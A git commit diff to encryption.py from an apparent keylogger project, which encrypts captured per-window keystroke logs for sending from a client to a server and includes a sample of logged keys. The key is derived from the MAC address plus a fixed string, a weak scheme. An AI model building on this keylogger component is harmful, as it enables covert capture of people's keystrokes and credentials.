4879ef5d69d1881a6f459d0abcc13a2e5dd130b2
Moshe Shulman <33040420+Msh36345@users.noreply.github.com>
2025-02-12 16:36:47 +0200

    Update to client and server

--- encryption.py
+++ encryption.py
@@ -6,23 +6,31 @@ from getmac import get_mac_address
 #exsemple
 aaa={"f8:54:f6:bc:2e:64": {"12/02/2025  16:04": {"Desktop – KeyLogger_Manager.py": ["k", "j", "k", "j", "k", "j", "d", "k", "w", "j", "k", "j", "k"], "כרטיסייה חדשה - Google Chrome": ["h", "k", "h", "k", "d", "j", "k", "j", "k", "j", "d", "s", "j", "k", "j", "k", "s"], "Program Manager": ["shift", "Q"]}}}
 
-#create key , to client and server
+#create key and encrypt for client
 address = get_mac_address().replace(":","f") #get mac address and replace ":" white "f"
 base_key = f"fp88{address}wAxDAAjijM=" #our key
 key=base64.urlsafe_b64encode(base_key.encode()) #convert to base64
 
-# encrypt, only to client
 def encrypt_data(dic_data):
     fernet = Fernet(key)
     encrypted_data = fernet.encrypt(json.dumps(dic_data).encode())
     return encrypted_data
 
 
-#decrypt, only to server
+
+
+#create key and decrypt for server
+mac=key_name = next(iter(aaa.keys()))
+replase_mac = mac.replace(":","f") #get mac address and replace ":" white "f"
+base_key = f"fp88{replase_mac}wAxDAAjijM=" #our key
+key=base64.urlsafe_b64encode(base_key.encode()) #convert to base64
+
 def decrypt_data(encrypted_data):
     fernet = Fernet(key)
     decrypted_data = fernet.decrypt(encrypted_data)
     return json.loads(decrypted_data.decode())
+
+
 
 # check
 encrypted = encrypt_data(aaa)
@@ -30,7 +38,3 @@ decrypted = decrypt_data(encrypted)
 
 print("🔒 Encrypted:", encrypted)
 print("🔓 Decrypted:", decrypted)
-
-
-
-
